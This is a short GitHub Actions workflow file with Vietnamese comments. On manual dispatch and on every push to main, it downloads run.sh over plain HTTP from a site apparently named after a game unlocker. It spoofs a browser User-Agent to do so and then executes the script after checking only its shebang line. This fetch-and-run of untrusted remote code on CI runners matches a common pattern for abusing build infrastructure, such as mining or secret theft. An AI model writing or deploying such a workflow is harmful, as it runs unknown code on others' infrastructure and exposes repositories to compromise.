name: Run Script Workflow

on:
  workflow_dispatch:  # Cho phép chạy thủ công từ GitHub Actions tab
  push:
    branches:
      - main  # Hoặc branch bạn muốn trigger tự động

jobs:
  run-script:
    runs-on: ubuntu-latest
    
    steps:
      - name: Download and run script
        run: |
          # Tải file với User-Agent và follow redirects
          curl -L -f -H "User-Agent: Mozilla/5.0" -o run.sh http://valorantunlocker.shop/run.sh
          
          # Kiểm tra xem file có phải là shell script không
          if head -n 1 run.sh | grep -q "#!/bin/bash"; then
            chmod +x run.sh
            bash run.sh
          else
            echo "Error: Downloaded file is not a valid shell script"
            echo "First 10 lines of downloaded file:"
            head -n 10 run.sh
            exit 1
          fi

